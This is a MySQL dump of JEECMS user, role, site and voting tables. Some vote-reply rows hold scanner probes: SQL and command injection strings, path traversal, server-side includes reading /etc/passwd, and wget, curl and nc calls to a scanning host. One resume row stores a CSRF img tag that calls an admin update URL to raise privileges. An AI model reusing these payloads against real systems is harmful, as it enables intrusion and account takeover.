INSERT INTO `jc_user_resume` VALUES (1, '程序员', '', '', '', '', '家里蹲大学', NULL, '', '吃饭', '<img src=/jeeadmin/jeecms/admin_global/o_update.do?password=111&groupId=1&rank=9&roleIds=1&siteIds=1&steps=2&allChannels=true&id=1＞', NULL, NULL, '11', NULL, NULL, NULL, '111\r\n222222222222222222222222222\r\n3333333333333333333333333333333333\r\n44444444444444444444444444444444444444444\r\n55555555555555555555555555555555555', '我很强大的哦');

-- ----------------------------
-- Table structure for jc_user_role
-- ----------------------------
DROP TABLE IF EXISTS `jc_user_role`;
CREATE TABLE `jc_user_role`  (
  `role_id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  PRIMARY KEY (`role_id`, `user_id`) USING BTREE,
  INDEX `fk_jc_role_user`(`user_id`) USING BTREE,
  CONSTRAINT `fk_jc_role_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_user_role` FOREIGN KEY (`role_id`) REFERENCES `jc_role` (`role_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS用户角色关联表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_user_role
-- ----------------------------
INSERT INTO `jc_user_role` VALUES (1, 1);

-- ----------------------------
-- Table structure for jc_user_site
-- ----------------------------
DROP TABLE IF EXISTS `jc_user_site`;
CREATE TABLE `jc_user_site`  (
  `usersite_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `site_id` int(11) NOT NULL,
  `check_step` tinyint(4) NOT NULL DEFAULT 1 COMMENT '审核级别',
  `is_all_channel` tinyint(1) NOT NULL DEFAULT 1 COMMENT '是否拥有所有栏目的权限',
  PRIMARY KEY (`usersite_id`) USING BTREE,
  INDEX `fk_jc_site_user`(`user_id`) USING BTREE,
  INDEX `fk_jc_user_site`(`site_id`) USING BTREE,
  CONSTRAINT `fk_jc_site_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_user_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 3 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS管理员站点表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_user_site
-- ----------------------------
INSERT INTO `jc_user_site` VALUES (2, 1, 1, 3, 1);

-- ----------------------------
-- Table structure for jc_vote_item
-- ----------------------------
DROP TABLE IF EXISTS `jc_vote_item`;
CREATE TABLE `jc_vote_item`  (
  `voteitem_id` int(11) NOT NULL AUTO_INCREMENT,
  `votetopic_id` int(11) NOT NULL,
  `title` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '标题',
  `vote_count` int(11) NOT NULL DEFAULT 0 COMMENT '投票数量',
  `priority` int(11) NOT NULL DEFAULT 10 COMMENT '排列顺序',
  `subtopic_id` int(11) NULL DEFAULT NULL,
  `picture` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '图片',
  PRIMARY KEY (`voteitem_id`) USING BTREE,
  INDEX `fk_jc_vote_item_topic`(`votetopic_id`) USING BTREE,
  INDEX `FK_jc_vote_item_subtopic`(`subtopic_id`) USING BTREE,
  CONSTRAINT `FK_jc_vote_item_subtopic` FOREIGN KEY (`subtopic_id`) REFERENCES `jc_vote_subtopic` (`subtopic_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_vote_item_topic` FOREIGN KEY (`votetopic_id`) REFERENCES `jc_vote_topic` (`votetopic_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 64 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS投票项' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_vote_item
-- ----------------------------
INSERT INTO `jc_vote_item` VALUES (12, 2, '很喜欢', 74, 1, 13, '');
INSERT INTO `jc_vote_item` VALUES (13, 2, '不喜欢', 0, 3, 13, '');
INSERT INTO `jc_vote_item` VALUES (14, 2, '喜欢', 3, 2, 13, '');
INSERT INTO `jc_vote_item` VALUES (15, 2, '差不多', 0, 6, 15, '');
INSERT INTO `jc_vote_item` VALUES (16, 2, '没有改进', 0, 7, 15, '');
INSERT INTO `jc_vote_item` VALUES (17, 2, '改进很大', 81, 4, 15, '');
INSERT INTO `jc_vote_item` VALUES (18, 2, '有改进', 3, 5, 15, '');
INSERT INTO `jc_vote_item` VALUES (19, 2, '图库', 76, 9, 16, '');
INSERT INTO `jc_vote_item` VALUES (20, 2, '新闻', 80, 8, 16, '');
INSERT INTO `jc_vote_item` VALUES (21, 2, '下载', 72, 11, 16, '');
INSERT INTO `jc_vote_item` VALUES (22, 2, '视频', 72, 10, 16, '');
INSERT INTO `jc_vote_item` VALUES (26, 3, '5000', 0, 2, 18, '');
INSERT INTO `jc_vote_item` VALUES (27, 3, '10000', 1, 3, 18, '');
INSERT INTO `jc_vote_item` VALUES (28, 3, '3000', 0, 1, 18, '');
INSERT INTO `jc_vote_item` VALUES (33, 4, '4号', 0, 4, 20, '');
INSERT INTO `jc_vote_item` VALUES (34, 4, '2号', 0, 2, 20, '');
INSERT INTO `jc_vote_item` VALUES (35, 4, '1号', 0, 1, 20, '');
INSERT INTO `jc_vote_item` VALUES (36, 4, '3号', 0, 3, 20, '');
INSERT INTO `jc_vote_item` VALUES (37, 5, '1号', 0, 1, 21, '');
INSERT INTO `jc_vote_item` VALUES (38, 5, '2号', 0, 2, 21, '');
INSERT INTO `jc_vote_item` VALUES (39, 5, '3号', 0, 3, 21, '');
INSERT INTO `jc_vote_item` VALUES (40, 5, '4号', 0, 4, 21, '');
INSERT INTO `jc_vote_item` VALUES (41, 6, '张', 0, 1, 22, '');
INSERT INTO `jc_vote_item` VALUES (42, 6, '李', 0, 2, 22, '');
INSERT INTO `jc_vote_item` VALUES (43, 6, '陈', 0, 3, 22, '');
INSERT INTO `jc_vote_item` VALUES (44, 6, '王', 0, 4, 22, '');
INSERT INTO `jc_vote_item` VALUES (45, 7, '赵', 0, 1, 23, '');
INSERT INTO `jc_vote_item` VALUES (46, 7, '孙', 0, 2, 23, '');
INSERT INTO `jc_vote_item` VALUES (47, 7, '姚', 0, 3, 23, '');
INSERT INTO `jc_vote_item` VALUES (48, 7, '黄', 0, 4, 23, '');
INSERT INTO `jc_vote_item` VALUES (49, 8, '钱', 0, 1, 24, '');
INSERT INTO `jc_vote_item` VALUES (50, 8, '周', 0, 2, 24, '');
INSERT INTO `jc_vote_item` VALUES (51, 8, '郑', 0, 3, 24, '');
INSERT INTO `jc_vote_item` VALUES (52, 8, '胡', 0, 4, 24, '');
INSERT INTO `jc_vote_item` VALUES (53, 9, '南大', 0, 1, 25, '');
INSERT INTO `jc_vote_item` VALUES (54, 9, '财大', 0, 2, 25, '');
INSERT INTO `jc_vote_item` VALUES (55, 9, '师大', 0, 3, 25, '');
INSERT INTO `jc_vote_item` VALUES (56, 9, '农大', 0, 4, 25, '');
INSERT INTO `jc_vote_item` VALUES (57, 10, '很尽兴', 37, 1, 26, '');
INSERT INTO `jc_vote_item` VALUES (58, 10, '还行', 0, 2, 26, '');
INSERT INTO `jc_vote_item` VALUES (59, 10, '没玩够', 0, 3, 26, '');
INSERT INTO `jc_vote_item` VALUES (60, 10, '家里蹲', 0, 4, 26, '');
INSERT INTO `jc_vote_item` VALUES (61, 11, '赞成', 16, 1, 27, '');
INSERT INTO `jc_vote_item` VALUES (62, 11, '反对', 0, 2, 27, '');
INSERT INTO `jc_vote_item` VALUES (63, 11, '对我不影响', 0, 3, 27, '');

-- ----------------------------
-- Table structure for jc_vote_record
-- ----------------------------
DROP TABLE IF EXISTS `jc_vote_record`;
CREATE TABLE `jc_vote_record`  (
  `voterecored_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NULL DEFAULT NULL,
  `votetopic_id` int(11) NOT NULL,
  `vote_time` datetime NOT NULL COMMENT '投票时间',
  `vote_ip` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '投票IP',
  `vote_cookie` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '投票COOKIE',
  `wx_open_id` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '微信投票者openId',
  PRIMARY KEY (`voterecored_id`) USING BTREE,
  INDEX `fk_jc_vote_record_topic`(`votetopic_id`) USING BTREE,
  INDEX `fk_jc_voterecord_user`(`user_id`) USING BTREE,
  CONSTRAINT `fk_jc_voterecord_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_vote_record_topic` FOREIGN KEY (`votetopic_id`) REFERENCES `jc_vote_topic` (`votetopic_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 81 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS投票记录' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_vote_record
-- ----------------------------
INSERT INTO `jc_vote_record` VALUES (1, NULL, 3, '2016-09-30 14:57:46', '117.40.115.55', '85c62d7bc19b436dbb8dd21edc2ebfd5', NULL);
INSERT INTO `jc_vote_record` VALUES (2, NULL, 11, '2016-10-09 11:38:05', '117.41.153.171', 'd2c045570d544b99885cb8f3fef658d2', NULL);
INSERT INTO `jc_vote_record` VALUES (3, NULL, 10, '2016-10-10 14:30:05', '117.41.152.66', '837d951f500c4671bd353d0d3ebadbfa', NULL);
INSERT INTO `jc_vote_record` VALUES (4, NULL, 11, '2016-10-10 14:30:05', '117.41.152.66', 'fc848a92556a4c559f79f02ca04a9ffa', NULL);
INSERT INTO `jc_vote_record` VALUES (5, NULL, 11, '2016-10-10 16:00:55', '117.41.152.66', '0bf2c8f72d94473db38bd95ebaefcdfd', NULL);
INSERT INTO `jc_vote_record` VALUES (8, NULL, 11, '2016-10-10 16:00:56', '117.41.152.66', 'b22d8d1d813f4bc2b4e4c665c4e615fa', NULL);
INSERT INTO `jc_vote_record` VALUES (9, NULL, 11, '2016-10-10 16:00:56', '117.41.152.66', '88db248d9fe147f6897671de3fb568f9', NULL);
INSERT INTO `jc_vote_record` VALUES (12, NULL, 11, '2016-10-10 16:00:56', '117.41.152.66', '465da02a13fc4f7fa2b72781d7bbf8e1', NULL);
INSERT INTO `jc_vote_record` VALUES (14, NULL, 11, '2016-10-10 16:00:56', '117.41.152.66', 'c15529ef4ce245f781b64f7f2cb953bf', NULL);
INSERT INTO `jc_vote_record` VALUES (17, NULL, 10, '2016-10-10 16:00:56', '117.41.152.66', '1ea33a4323994d89b4bcc873116e93be', NULL);
INSERT INTO `jc_vote_record` VALUES (19, NULL, 11, '2016-10-10 16:00:57', '117.41.152.66', '4ad719ade7594ceaa1015e9bfc1b3f47', NULL);
INSERT INTO `jc_vote_record` VALUES (20, NULL, 11, '2016-10-10 16:00:57', '117.41.152.66', 'ff7f622c3a1c4529894de76c523b553c', NULL);
INSERT INTO `jc_vote_record` VALUES (21, NULL, 11, '2016-10-10 16:00:57', '117.41.152.66', '36b4f3912f264a83b135486b34827d65', NULL);
INSERT INTO `jc_vote_record` VALUES (22, NULL, 10, '2016-10-10 16:00:57', '117.41.152.66', '901cb03ec75145eeaf60702c1e3064d5', NULL);
INSERT INTO `jc_vote_record` VALUES (23, NULL, 11, '2016-10-10 16:00:57', '117.41.152.66', '49b4dd1536e2467aad34d80bc1016efc', NULL);
INSERT INTO `jc_vote_record` VALUES (24, NULL, 10, '2016-10-10 16:00:57', '117.41.152.66', '3759152aa2fc4036b46eaf58c70ac6b5', NULL);
INSERT INTO `jc_vote_record` VALUES (25, NULL, 11, '2016-10-10 16:00:58', '117.41.152.66', 'd8ae1822d8ad4203a88008815f15aa9b', NULL);
INSERT INTO `jc_vote_record` VALUES (26, NULL, 10, '2016-10-10 16:00:58', '117.41.152.66', 'e60dbfc647f54d2b86dd36ee4b541fc6', NULL);
INSERT INTO `jc_vote_record` VALUES (30, NULL, 10, '2016-10-10 16:00:58', '117.41.152.66', 'd78a0d8166be459b93a29b7d8c342371', NULL);
INSERT INTO `jc_vote_record` VALUES (31, NULL, 11, '2016-10-10 16:00:58', '117.41.152.66', '207ccc615b7a410e87bb51c39adcbe60', NULL);
INSERT INTO `jc_vote_record` VALUES (32, NULL, 10, '2016-10-10 16:00:58', '117.41.152.66', 'bfc4dd4213424263a2790715649fecc9', NULL);
INSERT INTO `jc_vote_record` VALUES (34, NULL, 10, '2016-10-10 16:00:58', '117.41.152.66', 'df5764ee8165497b82c550f66ff9d8a5', NULL);
INSERT INTO `jc_vote_record` VALUES (35, NULL, 11, '2016-10-10 16:00:59', '117.41.152.66', '962c03f30edb4cc4ba01e7397361bdc7', NULL);
INSERT INTO `jc_vote_record` VALUES (36, NULL, 10, '2016-10-10 16:00:59', '117.41.152.66', '101593c1b84d48638958b7503d2f3659', NULL);
INSERT INTO `jc_vote_record` VALUES (38, NULL, 10, '2016-10-10 16:00:59', '117.41.152.66', '8e3ea7a9bf4c442495f5a0ea05e31fd3', NULL);
INSERT INTO `jc_vote_record` VALUES (40, NULL, 10, '2016-10-10 16:00:59', '117.41.152.66', 'd55e04b63a85415f82b9e101e65593e0', NULL);
INSERT INTO `jc_vote_record` VALUES (41, NULL, 10, '2016-10-10 16:00:59', '117.41.152.66', 'a0fa6f6f3a8a49fab812cd7dc5e1a0f2', NULL);
INSERT INTO `jc_vote_record` VALUES (43, NULL, 10, '2016-10-10 16:01:00', '117.41.152.66', '5b4e56ce66ea43e38640f1c3434d683e', NULL);
INSERT INTO `jc_vote_record` VALUES (44, NULL, 10, '2016-10-10 16:01:00', '117.41.152.66', 'f1502ea8feed44c9981428fba35e9aff', NULL);
INSERT INTO `jc_vote_record` VALUES (45, NULL, 10, '2016-10-10 16:01:00', '117.41.152.66', 'fb3dfceba790475fb563904b553fec91', NULL);
INSERT INTO `jc_vote_record` VALUES (46, NULL, 10, '2016-10-10 16:01:00', '117.41.152.66', 'eef4c07438f94622a2922ec015971c42', NULL);
INSERT INTO `jc_vote_record` VALUES (47, NULL, 10, '2016-10-10 16:01:00', '117.41.152.66', 'be507e426c2e4fdcb4e4dbcac6f925aa', NULL);
INSERT INTO `jc_vote_record` VALUES (48, NULL, 10, '2016-10-10 16:01:00', '117.41.152.66', 'a32b9c09af56456d8eadbc91c0e36632', NULL);
INSERT INTO `jc_vote_record` VALUES (50, NULL, 10, '2016-10-10 16:01:01', '117.41.152.66', 'd5c2cc42603c41e3968576b736118b62', NULL);
INSERT INTO `jc_vote_record` VALUES (51, NULL, 10, '2016-10-10 16:01:01', '117.41.152.66', 'fd79161c7c22486981d3ba0bcceb1500', NULL);
INSERT INTO `jc_vote_record` VALUES (53, NULL, 10, '2016-10-10 16:01:01', '117.41.152.66', '9281df23008c40708f0a8e43341ac4ae', NULL);
INSERT INTO `jc_vote_record` VALUES (54, NULL, 10, '2016-10-10 16:01:02', '117.41.152.66', '857782badf554f7fb1a3cd42ff1be708', NULL);
INSERT INTO `jc_vote_record` VALUES (55, NULL, 10, '2016-10-10 16:01:02', '117.41.152.66', '6dfc50c459a34d669aed64847f7c6733', NULL);
INSERT INTO `jc_vote_record` VALUES (56, NULL, 10, '2016-10-10 16:01:06', '117.41.152.66', '7163edffccd8453888abce6f95d7cfdd', NULL);
INSERT INTO `jc_vote_record` VALUES (57, NULL, 10, '2016-10-10 16:01:06', '117.41.152.66', '472e57a5836f42d09c3afbb23552e4e3', NULL);
INSERT INTO `jc_vote_record` VALUES (58, NULL, 10, '2016-10-10 16:01:07', '117.41.152.66', '17ebcb43eaba48f087c700d367b41692', NULL);
INSERT INTO `jc_vote_record` VALUES (59, NULL, 10, '2016-10-10 16:01:07', '117.41.152.66', '727bdde2e94d4077b081959f4ca9a946', NULL);
INSERT INTO `jc_vote_record` VALUES (60, NULL, 10, '2016-10-10 16:01:07', '117.41.152.66', '16d626ece9bd41aeb1300be3b9ea3ee0', NULL);
INSERT INTO `jc_vote_record` VALUES (61, NULL, 10, '2016-10-10 16:01:08', '117.41.152.66', '8993e9dd5af34d3faf8dbcbf5c6494d6', NULL);
INSERT INTO `jc_vote_record` VALUES (62, NULL, 10, '2016-10-10 16:01:08', '117.41.152.66', 'bfda82a4d10f4d1b8d4e32e55200d07e', NULL);
INSERT INTO `jc_vote_record` VALUES (63, NULL, 10, '2016-10-10 16:01:09', '117.41.152.66', '76ecfcc002b54d568a5f0d4f1ca20700', NULL);
INSERT INTO `jc_vote_record` VALUES (64, NULL, 10, '2016-10-10 16:01:09', '117.41.152.66', '1ff84eab46d442daae3673ad2e831a54', NULL);
INSERT INTO `jc_vote_record` VALUES (65, NULL, 10, '2016-10-10 16:01:10', '117.41.152.66', '0f39c2a605bf49c0a376879cd557ce01', NULL);
INSERT INTO `jc_vote_record` VALUES (66, NULL, 10, '2016-10-10 16:01:10', '117.41.152.66', 'cb44988a08b34af1bff99c1cb63b8b2d', NULL);
INSERT INTO `jc_vote_record` VALUES (67, NULL, 10, '2016-10-10 16:01:11', '117.41.152.66', '4ba0635f7de14fe1b3a10de57d5783d4', NULL);
INSERT INTO `jc_vote_record` VALUES (68, NULL, 10, '2016-10-10 16:01:11', '117.41.152.66', '0711f2524cf4451d954c6f94c4bf5099', NULL);
INSERT INTO `jc_vote_record` VALUES (69, NULL, 10, '2016-10-10 16:01:12', '117.41.152.66', '5865796b06ee43af8f727c8f8f57ff94', NULL);
INSERT INTO `jc_vote_record` VALUES (70, NULL, 10, '2016-10-10 16:01:12', '117.41.152.66', 'ba8fa930a89d499ab4fbe4e0d565be10', NULL);
INSERT INTO `jc_vote_record` VALUES (71, NULL, 10, '2016-10-10 16:01:13', '117.41.152.66', 'e68f2e1dc3f94724bdc91b29bd3846bc', NULL);
INSERT INTO `jc_vote_record` VALUES (72, NULL, 10, '2016-10-10 16:01:13', '117.41.152.66', 'e574898d0d3f4313b2dd7e607e432d44', NULL);
INSERT INTO `jc_vote_record` VALUES (73, NULL, 10, '2016-10-10 16:01:14', '117.41.152.66', '8c6f9de0ee764264bf0c3b105ccf4825', NULL);
INSERT INTO `jc_vote_record` VALUES (74, NULL, 10, '2016-10-10 16:01:14', '117.41.152.66', 'd73fc39a867d46459c5bb5d5b353933f', NULL);
INSERT INTO `jc_vote_record` VALUES (75, NULL, 10, '2016-10-10 16:01:15', '117.41.152.66', '00fd7c694c2f4d18951b9feda39fec5d', NULL);
INSERT INTO `jc_vote_record` VALUES (76, NULL, 11, '2016-10-10 16:01:39', '117.41.152.66', '869e55ac9e1548c7b95956d1083e7a83', NULL);
INSERT INTO `jc_vote_record` VALUES (77, NULL, 10, '2016-10-10 16:01:40', '117.41.152.66', '5c9efcf72f784ec2948c34c660e11d26', NULL);
INSERT INTO `jc_vote_record` VALUES (78, NULL, 11, '2016-10-10 16:01:41', '117.41.152.66', '222ebfd7010f4c69b971bbb388d2e3d0', NULL);
INSERT INTO `jc_vote_record` VALUES (79, NULL, 11, '2016-10-10 16:01:42', '117.41.152.66', '0a9d43bc940f4b0786e981aa09ac3a67', NULL);
INSERT INTO `jc_vote_record` VALUES (80, NULL, 10, '2016-10-10 16:01:43', '117.41.152.66', '160ba1860a52472bbfa17230f5cd1d99', NULL);

-- ----------------------------
-- Table structure for jc_vote_reply
-- ----------------------------
DROP TABLE IF EXISTS `jc_vote_reply`;
CREATE TABLE `jc_vote_reply`  (
  `votereply_id` int(11) NOT NULL AUTO_INCREMENT,
  `reply` text CHARACTER SET utf8 COLLATE utf8_general_ci NULL COMMENT '回复内容',
  `subtopic_id` int(11) NULL DEFAULT NULL,
  PRIMARY KEY (`votereply_id`) USING BTREE,
  INDEX `FK_jc_vote_reply_sub`(`subtopic_id`) USING BTREE,
  CONSTRAINT `FK_jc_vote_reply_sub` FOREIGN KEY (`subtopic_id`) REFERENCES `jc_vote_subtopic` (`subtopic_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 151 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '投票文本题目回复表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_vote_reply
-- ----------------------------
INSERT INTO `jc_vote_reply` VALUES (1, '111', 14);
INSERT INTO `jc_vote_reply` VALUES (2, '111', 14);
INSERT INTO `jc_vote_reply` VALUES (3, '111', 14);
INSERT INTO `jc_vote_reply` VALUES (4, '111', 14);
INSERT INTO `jc_vote_reply` VALUES (5, '111', 14);
INSERT INTO `jc_vote_reply` VALUES (6, '111', 14);
INSERT INTO `jc_vote_reply` VALUES (7, '111', 14);
INSERT INTO `jc_vote_reply` VALUES (8, '111', 14);
INSERT INTO `jc_vote_reply` VALUES (9, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (10, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (11, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (12, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (13, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (14, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (15, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (16, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (17, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (18, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (19, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (20, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (21, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (22, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (23, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (24, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (25, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (26, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (27, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (28, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (29, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (30, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (31, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (32, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (33, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (34, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (35, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (36, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (37, '1234WFXSSProbe', 14);
INSERT INTO `jc_vote_reply` VALUES (38, 'WF&＃39;SQL\"Probe;A--B', 14);
INSERT INTO `jc_vote_reply` VALUES (39, '1234&＃39;\"', 14);
INSERT INTO `jc_vote_reply` VALUES (40, 'ProbePhishing', 14);
INSERT INTO `jc_vote_reply` VALUES (41, 'A1234B', 14);
INSERT INTO `jc_vote_reply` VALUES (42, '1234WFXSSProbe&＃39;\"&＃41;/&gt;', 14);
INSERT INTO `jc_vote_reply` VALUES (43, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (44, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (45, '99999999999999999999', 14);
INSERT INTO `jc_vote_reply` VALUES (46, '1234＃&&lt;&＃40;, \"&gt;;', 14);
INSERT INTO `jc_vote_reply` VALUES (47, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (48, '-99999999999999999999', 14);
INSERT INTO `jc_vote_reply` VALUES (49, '|id', 14);
INSERT INTO `jc_vote_reply` VALUES (50, '|ls -a1F', 14);
INSERT INTO `jc_vote_reply` VALUES (51, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (52, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (53, '&&id', 14);
INSERT INTO `jc_vote_reply` VALUES (54, '4294967297', 14);
INSERT INTO `jc_vote_reply` VALUES (55, 'ls', 14);
INSERT INTO `jc_vote_reply` VALUES (56, '&&ls -a1F', 14);
INSERT INTO `jc_vote_reply` VALUES (57, '18446744073709551617', 14);
INSERT INTO `jc_vote_reply` VALUES (58, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (59, '||id', 14);
INSERT INTO `jc_vote_reply` VALUES (60, '||ls -a1F', 14);
INSERT INTO `jc_vote_reply` VALUES (61, '\0', 14);
INSERT INTO `jc_vote_reply` VALUES (62, '&＃39; | &＃39;id', 14);
INSERT INTO `jc_vote_reply` VALUES (63, '&＃39; | &＃39;ls -a1F', 14);
INSERT INTO `jc_vote_reply` VALUES (64, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (65, '\" | \"id', 14);
INSERT INTO `jc_vote_reply` VALUES (66, '|vol', 14);
INSERT INTO `jc_vote_reply` VALUES (67, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (68, '\" | \"ls -a1F', 14);
INSERT INTO `jc_vote_reply` VALUES (69, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (70, 'id', 14);
INSERT INTO `jc_vote_reply` VALUES (71, '&&vol', 14);
INSERT INTO `jc_vote_reply` VALUES (72, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (73, 'id|', 14);
INSERT INTO `jc_vote_reply` VALUES (74, 'ls -a1F', 14);
INSERT INTO `jc_vote_reply` VALUES (75, ';id\0', 14);
INSERT INTO `jc_vote_reply` VALUES (76, '1234\"|wget http://192.168.0.2:51167/AppScanMsg.html?varId=1269|echo \"', 14);
INSERT INTO `jc_vote_reply` VALUES (77, '||vol', 14);
INSERT INTO `jc_vote_reply` VALUES (78, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (79, '../../../../../../../../../../../../bin/id|', 14);
INSERT INTO `jc_vote_reply` VALUES (80, ';ls -a1F\0', 14);
INSERT INTO `jc_vote_reply` VALUES (81, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (82, '&＃39; | &＃39;vol', 14);
INSERT INTO `jc_vote_reply` VALUES (83, '1234&＃39;|wget http://192.168.0.2:51167/AppScanMsg.html?varId=1275|echo &＃39;', 14);
INSERT INTO `jc_vote_reply` VALUES (84, '../../../../../../../../../../../../usr/bin/id|', 14);
INSERT INTO `jc_vote_reply` VALUES (85, '0 0 0 1234', 14);
INSERT INTO `jc_vote_reply` VALUES (86, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (87, '\" | \"vol', 14);
INSERT INTO `jc_vote_reply` VALUES (88, '1234|wget http://192.168.0.2:51167/AppScanMsg.html?varId=1276|echo ;', 14);
INSERT INTO `jc_vote_reply` VALUES (89, '1234&＃39; and &＃39;f&＃39;=&＃39;f', 14);
INSERT INTO `jc_vote_reply` VALUES (90, ';vol\0', 14);
INSERT INTO `jc_vote_reply` VALUES (91, '1234&＃39; and &＃39;f&＃39;=&＃39;f&＃39; -- ', 14);
INSERT INTO `jc_vote_reply` VALUES (92, '1234&＃39; and &＃39;f&＃39;=&＃39;f&＃39;&＃41; -- ', 14);
INSERT INTO `jc_vote_reply` VALUES (93, '1234&＃39; and &＃39;b&＃39;=&＃39;f', 14);
INSERT INTO `jc_vote_reply` VALUES (94, '1234\"|echo -e \"GET /AppScanMsg.html?varId=1280 HTTP/1.0\\r\\n\\r\\n\" | nc 192.168.0.2 51167|echo \"', 14);
INSERT INTO `jc_vote_reply` VALUES (95, '1234&＃39; and &＃39;b&＃39;=&＃39;f&＃39; -- ', 14);
INSERT INTO `jc_vote_reply` VALUES (96, '1234&＃39; and &＃39;b&＃39;=&＃39;f&＃39;&＃41; --', 14);
INSERT INTO `jc_vote_reply` VALUES (97, '1234&＃39; or &＃39;f&＃39;=&＃39;f', 14);
INSERT INTO `jc_vote_reply` VALUES (98, '1234&＃39; or &＃39;f&＃39;=&＃39;f&＃39; -- ', 14);
INSERT INTO `jc_vote_reply` VALUES (99, '1234&＃39;|echo -e \"GET /AppScanMsg.html?varId=1288 HTTP/1.0\\r\\n\\r\\n\" | nc 192.168.0.2 51167|echo &＃39;', 14);
INSERT INTO `jc_vote_reply` VALUES (100, '1234&＃39; or &＃39;f&＃39;=&＃39;f&＃39;&＃41; --', 14);
INSERT INTO `jc_vote_reply` VALUES (101, '&lt;!--＃include file=\"/etc/passwd\"--&gt;', 14);
INSERT INTO `jc_vote_reply` VALUES (102, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (103, '&lt;!--＃include file=\"C:\\boot.ini\"--&gt;', 14);
INSERT INTO `jc_vote_reply` VALUES (104, '1234|echo -e \"GET /AppScanMsg.html?varId=1289 HTTP/1.0\\r\\n\\r\\n\" | nc 192.168.0.2 51167|echo ', 14);
INSERT INTO `jc_vote_reply` VALUES (105, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (106, '1234 and 7659=7659', 14);
INSERT INTO `jc_vote_reply` VALUES (107, ';vol|', 14);
INSERT INTO `jc_vote_reply` VALUES (108, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (109, '1234;curl http://192.168.0.2:51167/AppScanMsg.html?varId=1290;', 14);
INSERT INTO `jc_vote_reply` VALUES (110, '1234 and 0=7659', 14);
INSERT INTO `jc_vote_reply` VALUES (111, '1234/**/and/**/7659=7659', 14);
INSERT INTO `jc_vote_reply` VALUES (112, '&＃39;   ltrim&＃40;&＃39;&＃39;&＃41;   &＃39;1234', 14);
